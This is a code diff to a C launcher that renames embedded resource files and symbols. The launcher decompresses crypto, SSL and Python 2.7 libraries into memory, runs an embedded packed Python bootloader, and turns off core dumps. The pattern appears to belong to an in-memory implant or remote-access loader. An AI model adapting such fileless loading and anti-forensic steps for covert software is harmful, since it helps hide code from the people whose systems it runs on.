@@ -21,10 +21,10 @@
 #include "tmplibrary.h"
 #include "debug.h"
 
-#include "resources_bootloader_pyc.c"
-#include "resources_python27_so.c"
-#include "resources_libssl_so.c"
-#include "resources_libcrypto_so.c"
+#include "bootloader.c"
+#include "python27.c"
+#include "libssl.c"
+#include "libcrypto.c"
 
 #include "revision.h"
 
@@ -81,18 +81,18 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
     lim.rlim_cur = 0; lim.rlim_max = 0;
     setrlimit(RLIMIT_CORE, &lim);
 
-    xz_dynload("libcrypto.so.1.0.0", resources_libcrypto_so_start, resources_libcrypto_so_size);
-    xz_dynload("libssl.so.1.0.0", resources_libssl_so_start, resources_libssl_so_size);
+    xz_dynload("libcrypto.so.1.0.0", libcrypto_c_start, libcrypto_c_size);
+    xz_dynload("libssl.so.1.0.0", libssl_c_start, libssl_c_size);
 
     if(!Py_IsInitialized) {
         _load_python(
-            xz_dynload("libpython2.7.so.1.0", resources_python27_so_start, resources_python27_so_size)
+            xz_dynload("libpython2.7.so.1.0", python27_c_start, python27_c_size)
         );
     }
 
-    munmap((char *) resources_libcrypto_so_start, resources_libcrypto_so_size);
-    munmap((char *) resources_libssl_so_start, resources_libssl_so_size);
-    munmap((char *) resources_python27_so_start, resources_python27_so_size);
+    munmap((char *) libcrypto_c_start, libcrypto_c_size);
+    munmap((char *) libssl_c_start, libssl_c_size);
+    munmap((char *) python27_c_start, python27_c_size);
 
     dprint("calling PyEval_InitThreads() ...\n");
     PyEval_InitThreads();
@@ -156,11 +156,11 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
     m = PyImport_AddModule("__main__");
     if (m) d = PyModule_GetDict(m);
     if (d) seq = PyObject_lzmaunpack(
-        resources_bootloader_pyc_start,
-        resources_bootloader_pyc_size
+        bootloader_c_start,
+        bootloader_c_size
     );
 
-    munmap((char *) resources_bootloader_pyc_start, resources_bootloader_pyc_size);
+    munmap((char *) bootloader_c_start, bootloader_c_size);
 
     if (seq) {
         Py_ssize_t i, max = PySequence_Length(seq);
